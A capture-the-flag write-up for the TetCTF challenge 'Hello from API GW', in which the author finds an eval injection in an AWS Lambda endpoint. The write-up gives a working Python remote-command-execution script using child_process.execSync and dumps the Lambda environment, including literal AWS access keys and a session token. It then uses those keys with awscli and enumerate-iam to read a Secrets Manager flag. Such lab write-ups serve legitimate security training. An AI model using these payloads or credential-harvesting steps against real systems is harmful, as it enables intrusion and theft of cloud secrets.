# Hello from API GW

## Description:

-   Let’s see what you can do with this vulnerable API GW endpoint
-   Server:  [https://huk5xbypcc.execute-api.ap-southeast-2.amazonaws.com/dev/vulnerable?vulnerable="Welcome](https://huk5xbypcc.execute-api.ap-southeast-2.amazonaws.com/dev/vulnerable?vulnerable=%22Welcome)  to TetCTF!"

Author:
-   Chi Tran (Twitter: @imspicynoodles) (Discord: iam.chi)
    

Material:

-   AWS Account is not needed for this challenge

## Hacking The API

Given API url seems to reflect on what we give, giving it string gives back a string.

```bash
└─$ URL='https://huk5xbypcc.execute-api.ap-southeast-2.amazonaws.com/dev/vulnerable'

└─$ curl "$URL?vulnerable=Welcome"   # Not String
{"error":"Welcome is not defined"}                   
     
└─$ curl "$URL?vulnerable='Welcome'" # String
{"message":"Evaluated User Input","result":"Welcome"}      

└─$ curl "$URL?vulnerable='2-1'"     # String - String
{"message":"Evaluated User Input","result":"2-1"}        

└─$ curl "$URL?vulnerable=2-1"       # Int - Int
{"message":"Evaluated User Input","result":1}
```

From this few requests we see that some kind of evaluation is done with our input. My first thought was a python script, but then I tried JavaScript code and it worked.

```bash
└─$ curl "$URL?vulnerable=chr(0x41)" # Python
{"error":"chr is not defined"}

└─$ curl "$URL?vulnerable=String.fromCharCode(0x41)" # JavaScript
{"message":"Evaluated User Input","result":"A"}
```

Exploit the service:
```py
import requests
import readline # Allows using arrow keys in `input`

URL = 'https://huk5xbypcc.execute-api.ap-southeast-2.amazonaws.com/dev/vulnerable'
PARAMS = { 'vulnerable': 'Hallo' }
PAYLOAD = "require('child_process').execSync('{command}').toString()"

while True:
    PARAMS['vulnerable'] = PAYLOAD.format(command=(input('Command: ').strip()))
    resp = requests.get(URL, params=PARAMS).json()
    try:
        print(f'Result: {resp["result"]}')
    except KeyError:
        for k, v in resp.items():
            print(f'{k}: {v}')
```

<details>
<summary markdown="span">index.js</summary>

```js
exports.handler = async (event) => {
  try {
    if (event.queryStringParameters && event.queryStringParameters.vulnerable) {
      let result = eval(event.queryStringParameters.vulnerable);
      return {
        statusCode: 200,
        body: JSON.stringify({
          message: "Evaluated User Input",
          result: result,
        }),
      };
    }
    return { statusCode: 200, body: JSON.stringify("Hello from Lambda") };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message }),
    };
  }
};
```

</details>


```bash
└─$ py solve.py
Command: ls -alh
Result: total 5.0K
drwxr-xr-x  2 root root   31 Jan 25 03:28 .
drwxr-xr-x 24 root root 4.0K Nov 13 19:38 ..
-rwxr-xr-x  1 root root  823 Jan 25 03:28 index.js

Command: ls -alh /
Result: total 172K
drwxr-xr-x  17 root         root 4.0K Jul 11  2023 .
drwxr-xr-x  17 root         root 4.0K Jul 11  2023 ..
lrwxrwxrwx   1 root         root    7 Nov 13 19:38 bin -> usr/bin
dr-xr-xr-x   2 root         root 4.0K Apr  9  2019 boot
drwxr-xr-x   2 root         root 4.0K Jan 28 13:11 dev
drwxr-xr-x  30 root         root 4.0K Nov 13 19:38 etc
drwxr-xr-x   2 root         root 4.0K Apr  9  2019 home
-rwxr-xr-x   1 root         root  397 Nov 22 17:05 lambda-entrypoint.sh
lrwxrwxrwx   1 root         root    7 Nov 13 19:38 lib -> usr/lib
lrwxrwxrwx   1 root         root    9 Nov 13 19:38 lib64 -> usr/lib64
drwxr-xr-x   2 root         root 4.0K Apr  9  2019 media
drwxr-xr-x   2 root         root 4.0K Apr  9  2019 mnt
drwxr-xr-x   2 root         root 4.0K Apr  9  2019 opt
dr-xr-xr-x 124 root         root    0 Jan 28 14:07 proc
dr-xr-x---   2 root         root 4.0K Apr  9  2019 root
drwxr-xr-x   2 root         root 4.0K Nov 13 19:38 run
lrwxrwxrwx   1 root         root    8 Nov 13 19:38 sbin -> usr/sbin
drwxr-xr-x   2 root         root 4.0K Apr  9  2019 srv
dr-xr-xr-x   2 root         root 4.0K Apr  9  2019 sys
-rw-r--r--   1 root         root 104K Dec  1 13:50 THIRD-PARTY-LICENSES.txt
drwx------   2 sbx_user1051  990 4.0K Jan 28 14:19 tmp
drwxr-xr-x  13 root         root 4.0K Jul 11  2023 usr
drwxr-xr-x  24 root         root 4.0K Nov 13 19:38 var

Command: env
Result: AWS_LAMBDA_FUNCTION_VERSION=$LATEST
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEB4aDmFwLXNvdXRoZWFzdC0yIkYwRAIgaF1ii5gdENKxv4P/cqaeDqjnq/3YsbDc2d6UdchtLkQCIDSlguoy7jOMbO2X/202yCk3FVWOD7Ea5spqim/GQcAzKsUDCNf//////////wEQAxoMNTQzMzAzMzkzODU5IgzZSY0wYJDWb62rktIqmQN0R+v1rp9NRwEUyHdgiIAOBh/6OwBy0xeYB+uIAstsEe6RtBziaH9rI0gVYgnkqr0uXqiKD5Wv4RrEdwLRxwxMAyQdFShl2Eu30kSt7ojk1cthRR5XhyH7hlGR+KM1hMziVnCEEP6hEVpicfGk/GGxp9/ucbC7jdRFUb97Wj+/QeQ1U+5uHm2kZVKHYSowBb8RT4NaK6dCM0QGb+maw3KbW+/MNPGEGe0axIn2OM7QYLXSLRNj0/uTURTELLxakaVBTukYiMQon2YO9g7bD7J2c/4U3alTboqu26c6VFjpGOispjDPOgrRpowTN7OnHPhgphxre6KOKmugQ+ZasrHtwnpwvIq9z8oR+8yT/Q1N7dyVwK3/nscZZJL1y7RPhJ9enbwaHrKuBzwUITzKMSAGDT9jE9VDU9oHPccIAbykjBYfe8u9XfjXjew21MyzzP+gMUfj3F1S8oGS9nA/FJtCA6CSs9p9VVUf/j7nrDPucIJI8bmLICeO1tiilCA7ldemdUhuxyB/RiATgki9Gf7/KzzjhnlmJX4XMM++2a0GOp8BvLEfZ8mmxEQOAPZXFHL+rPj2JQv2pdHb1o65AKF2REcwuPPtAyQ3yXlrTfNYcn8QYnVofKOICpKu62nPGU5U6n24EcHbB5hjHLgkJduPyx566CkGnyDi0/pgtqZcjiuYfW5l7od7oAyIM8X9xDv56+BUstoejqATcTGF/TUUtUOvD0h6tGHo/pRaEpBR5NeJs61BShRxFrhbwdrZ4ZUS
LAMBDA_TASK_ROOT=/var/task
LD_LIBRARY_PATH=/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib
AWS_LAMBDA_LOG_GROUP_NAME=/aws/lambda/TetCtfStack-VulnerableLambdaAA73A104-aSkHuTfgUzPR
AWS_LAMBDA_RUNTIME_API=127.0.0.1:9001
AWS_LAMBDA_LOG_STREAM_NAME=2024/01/28/[$LATEST]e3c5df2a83b9470b8737aa2613c47db6
AWS_EXECUTION_ENV=AWS_Lambda_nodejs18.x
AWS_LAMBDA_FUNCTION_NAME=TetCtfStack-VulnerableLambdaAA73A104-aSkHuTfgUzPR
AWS_XRAY_DAEMON_ADDRESS=169.254.79.129:2000
PATH=/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin
AWS_DEFAULT_REGION=ap-southeast-2
PWD=/var/task
AWS_SECRET_ACCESS_KEY=J+RRA/WO0JrB39/NN5q5IKmYz/pCHZEomwuNMk69
LANG=en_US.UTF-8
LAMBDA_RUNTIME_DIR=/var/runtime
AWS_LAMBDA_INITIALIZATION_TYPE=on-demand
AWS_REGION=ap-southeast-2
TZ=:UTC
NODE_PATH=/opt/nodejs/node18/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task
ENV_ACCESS_KEY=AKIAX473H4JB76WRTYPI
AWS_ACCESS_KEY_ID=ASIAX473H4JBYPFD27HS
ENV_SECRET_ACCESS_KEY=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
SHLVL=1
_AWS_XRAY_DAEMON_ADDRESS=169.254.79.129
_AWS_XRAY_DAEMON_PORT=2000
_X_AMZN_TRACE_ID=Root=1-65b668cf-0d1670002095cb574c648810;Parent=6f429a841cef9293;Sampled=0;Lineage=c3b1dc18:0
AWS_XRAY_CONTEXT_MISSING=LOG_ERROR
_HANDLER=index.handler
AWS_LAMBDA_FUNCTION_MEMORY_SIZE=128
NODE_EXTRA_CA_CERTS=/var/runtime/ca-cert.pem
_=/usr/bin/env
```

Interesting variables:
```ini
ENV_ACCESS_KEY=AKIAX473H4JB76WRTYPI
ENV_SECRET_ACCESS_KEY=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

AWS_ACCESS_KEY_ID=ASIAX473H4JBYPFD27HS
AWS_SECRET_ACCESS_KEY=J+RRA/WO0JrB39/NN5q5IKmYz/pCHZEomwuNMk69
AWS_REGION=ap-southeast-2
```

## Hacking The Cloud
::: info :information_source:
For this step [***awscli***](https://github.com/aws/aws-cli) is required.
:::

First we need to register the credentials. Here I first tried the ENV_* variables:

```bash
└─$ aws configure
AWS Access Key ID [None]: AKIAX473H4JB76WRTYPI
AWS Secret Access Key [None]: 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
Default region name [None]: ap-southeast-2
Default output format [None]: 
```

Since this was my first time interacting with cloud I just refered to [HackTricks](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security).<br>
Do simple enum:

```bash
└─$ aws iam get-user

An error occurred (AccessDenied) when calling the GetUser operation: User: arn:aws:iam::543303393859:user/secret-user is not authorized to perform: iam:GetUser on resource: user secret-user because no identity-based policy allows the iam:GetUser action
```

`User: arn:aws:iam::543303393859:user/secret-user` seems promising.

Using [enumerate-iam](https://github.com/andresriancho/enumerate-iam) check what permissions you have in the cloud.

```bash
└─$ py ./enumerate-iam.py --access-key 'AKIAX473H4JB76WRTYPI' --secret-key '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' --region 'ap-southeast-2'
2024-01-28 18:57:38,463 - 3176 - [INFO] Starting permission enumeration for access-key-id "AKIAX473H4JB76WRTYPI"
2024-01-28 18:57:39,613 - 3176 - [INFO] -- Account ARN : arn:aws:iam::543303393859:user/secret-user
2024-01-28 18:57:39,613 - 3176 - [INFO] -- Account Id  : 543303393859
2024-01-28 18:57:39,614 - 3176 - [INFO] -- Account Path: user/secret-user
2024-01-28 18:57:39,785 - 3176 - [INFO] Attempting common-service describe / list brute force.
2024-01-28 18:57:43,370 - 3176 - [INFO] -- iam.get_account_password_policy() worked!
2024-01-28 18:57:47,032 - 3176 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2024-01-28 18:57:51,705 - 3176 - [ERROR] Remove codedeploy.batch_get_deployment_targets action
2024-01-28 18:57:53,197 - 3176 - [ERROR] Remove codedeploy.list_deployment_targets action
2024-01-28 18:57:53,902 - 3176 - [ERROR] Remove codedeploy.get_deployment_target action
2024-01-28 18:57:56,790 - 3176 - [INFO] -- dynamodb.describe_endpoints() worked!
2024-01-28 18:58:11,493 - 3176 - [INFO] -- secretsmanager.list_secrets() worked!
2024-01-28 18:58:18,306 - 3176 - [INFO] -- sts.get_caller_identity() worked!
2024-01-28 18:58:18,470 - 3176 - [INFO] -- sts.get_session_token() worked!
```

[secretsmanager](https://docs.aws.amazon.com/cli/latest/reference/secretsmanager/) seems interesting...

```bash
└─$ aws secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:ap-southeast-2:543303393859:secret:prod/TetCTF/Flag-gnvT27",
            "Name": "prod/TetCTF/Flag",
            "LastChangedDate": 1706155046.205,
            "LastAccessedDate": 1706400000.0,
            "Tags": [],
            "SecretVersionsToStages": {
                "44e68972-c191-4bc8-acc8-d0ba3a29cea6": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": 1706155045.933
        }
    ]
} 

└─$ aws secretsmanager get-secret-value --secret-id 'prod/TetCTF/Flag'
{
    "ARN": "arn:aws:secretsmanager:ap-southeast-2:543303393859:secret:prod/TetCTF/Flag-gnvT27",
    "Name": "prod/TetCTF/Flag",
    "VersionId": "44e68972-c191-4bc8-acc8-d0ba3a29cea6",
    "SecretString": "{\"Flag\":\"TetCTF{B0unTy_$$$-50_for_B3ginNeR_2a3287f970cd8837b91f4f7472c5541a}\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1706155046.202
}
```

## Flag
::: tip Flag
`TetCTF{B0unTy_$$$-50_for_B3ginNeR_2a3287f970cd8837b91f4f7472c5541a}`
:::